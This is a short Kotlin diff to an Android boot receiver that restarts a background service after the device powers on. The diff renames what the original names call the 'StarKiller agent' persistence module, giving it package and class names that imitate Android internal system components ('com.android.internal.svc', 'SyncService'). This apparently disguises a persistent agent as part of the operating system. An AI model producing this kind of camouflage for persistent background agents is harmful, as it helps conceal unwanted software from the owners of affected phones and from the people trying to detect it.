@@ -1,16 +1,16 @@
-package com.starkiller.agent.persistence
+package com.android.internal.svc.persistence
 
 import android.content.BroadcastReceiver
 import android.content.Context
 import android.content.Intent
 import android.os.Build
-import com.starkiller.agent.StarKillerService
+import com.android.internal.svc.SyncService
 
-class BootReceiver : BroadcastReceiver() {
+class StartReceiver : BroadcastReceiver() {
     override fun onReceive(context: Context, intent: Intent?) {
         if (intent?.action == Intent.ACTION_BOOT_COMPLETED ||
             intent?.action == "android.intent.action.QUICKBOOT_POWERON") {
-            val serviceIntent = Intent(context, StarKillerService::class.java)
+            val serviceIntent = Intent(context, SyncService::class.java)
             if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.O) {
                 context.startForegroundService(serviceIntent)
             } else {
